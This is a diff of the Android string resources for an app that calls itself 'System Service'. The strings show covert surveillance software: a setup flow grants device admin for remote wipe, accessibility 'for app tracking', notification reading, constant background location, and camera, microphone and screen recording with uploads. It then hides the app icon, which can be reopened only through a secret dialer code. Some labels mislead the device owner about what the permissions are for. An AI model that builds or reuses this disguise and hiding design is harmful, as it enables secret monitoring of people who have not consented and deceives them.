@@ -1,31 +1,21 @@
 <resources>
-    <!-- App -->
     <string name="app_name">System Service</string>
 
-    <!-- Notification -->
     <string name="notification_channel_name">System Service</string>
     <string name="notification_channel_desc">Background system service</string>
     <string name="notification_title">System Service</string>
     <string name="notification_text">Running</string>
-    <string name="notification_recording">Screen recording</string>
-    <string name="notification_live">Live stream active</string>
 
-    <!-- Accessibility -->
     <string name="accessibility_service_label">System Accessibility</string>
     <string name="accessibility_service_description">Enables system-level accessibility features for better device management.</string>
 
-    <!-- ⭐ Admin -->
     <string name="admin_description">Required for remote lock and wipe features</string>
 
-    <!-- Main Screen -->
     <string name="main_title">System Service</string>
     <string name="main_device_key">Device Key</string>
     <string name="main_copy_key">Copy</string>
     <string name="main_copied">Copied!</string>
-    <string name="main_status_ready">Ready</string>
-    <string name="main_status_not_ready">Setup required</string>
 
-    <!-- Buttons -->
     <string name="btn_enable_admin">Enable Device Admin</string>
     <string name="btn_grant_permissions">Grant Permissions</string>
     <string name="btn_start_setup">Start Setup</string>
@@ -35,67 +25,10 @@
     <string name="btn_skip">Skip</string>
     <string name="btn_done">Done</string>
     <string name="btn_cancel">Cancel</string>
-    <string name="btn_confirm">Confirm</string>
-    <string name="btn_ok">OK</string>
-    <string name="btn_open_settings">Open Settings</string>
 
-    <!-- Setup -->
     <string name="setup_title">Setup</string>
     <string name="setup_step_counter">Step %1$d of %2$d</string>
-    <string name="setup_step_permissions">Grant basic permissions</string>
-    <string name="setup_step_permissions_desc">Camera, Microphone, Location access needed</string>
-    <string name="setup_step_admin">Enable Device Admin</string>
-    <string name="setup_step_admin_desc">Required for remote lock and wipe features</string>
-    <string name="setup_step_battery">Disable Battery Optimization</string>
-    <string name="setup_step_battery_desc">Allows service to run in background</string>
-    <string name="setup_step_autostart">Enable Autostart</string>
-    <string name="setup_step_autostart_desc">ColorOS/Realme UI: Allow app to auto-start</string>
-    <string name="setup_step_accessibility">Enable Accessibility Service</string>
-    <string name="setup_step_accessibility_desc">For app tracking and auto-restart</string>
-    <string name="setup_step_notification">Enable Notification Access</string>
-    <string name="setup_step_notification_desc">Allows reading important notifications</string>
-    <string name="setup_step_background_location">Background Location</string>
-    <string name="setup_step_background_location_desc">Set Location permission to "Allow all the time"</string>
-    <string name="setup_step_hide">Hide Icon &amp; Start</string>
-    <string name="setup_step_hide_desc">App icon will hide and service will start</string>
 
-    <!-- Permission Screen -->
     <string name="perm_title">Permissions Required</string>
-    <string name="perm_runtime">Runtime Permissions</string>
-    <string name="perm_battery">Battery Optimization</string>
-    <string name="perm_accessibility">Accessibility</string>
-    <string name="perm_notification">Notification Access</string>
-    <string name="perm_overlay">Overlay Permission</string>
-    <string name="perm_exact_alarm">Alarms &amp; Reminders</string>
-    <string name="perm_granted">Granted</string>
-    <string name="perm_denied">Not granted</string>
     <string name="perm_grant_all">Grant All Permissions</string>
-    <string name="perm_all_granted">All permissions granted</string>
-    <string name="perm_missing_count">%1$d permission(s) missing</string>
-
-    <!-- Alerts -->
-    <string name="alert_admin_enabled">Device Admin already enabled</string>
-    <string name="alert_admin_activated">Admin activated successfully</string>
-    <string name="alert_confirm_hide">App icon will hide and background service will start.\n\nSave your Device Key:\n\n%1$s\n\nTo reopen app dial:\n*#*#6969#*#*</string>
-    <string name="alert_confirm_title">Confirm</string>
-    <string name="alert_yes">Yes, Start</string>
-    <string name="alert_no">Cancel</string>
-    <string name="alert_service_started">Service started, icon hidden</string>
-    <string name="alert_show_icon_confirm">Show app icon in launcher?</string>
-
-    <!-- Errors -->
-    <string name="error_no_permission">Permission required</string>
-    <string name="error_no_internet">No internet connection</string>
-    <string name="error_upload_failed">Upload failed</string>
-    <string name="error_recording_failed">Recording failed</string>
-    <string name="error_camera_failed">Camera failed</string>
-    <string name="error_consent_required">Screen recording consent required</string>
-
-    <!-- Media -->
-    <string name="media_photo">Photo</string>
-    <string name="media_video">Video</string>
-    <string name="media_audio">Audio</string>
-    <string name="media_screen">Screen Recording</string>
-    <string name="media_uploading">Uploading…</string>
-    <string name="media_uploaded">Uploaded</string>
 </resources>
